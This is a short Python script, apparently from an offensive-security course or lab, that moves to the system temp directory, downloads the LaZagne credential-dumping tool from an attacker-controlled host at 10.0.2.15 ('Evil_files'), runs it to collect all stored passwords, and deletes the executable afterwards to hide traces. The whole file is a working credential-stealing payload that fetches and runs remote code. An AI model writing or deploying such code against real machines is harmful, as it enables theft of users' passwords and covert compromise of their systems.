#!/usr/bin/env python

from ..Download_file import download
import subprocess
import tempfile
import os

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download.download("http://10.0.2.15/Evil_files/lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
os.remove("laZagne.exe")
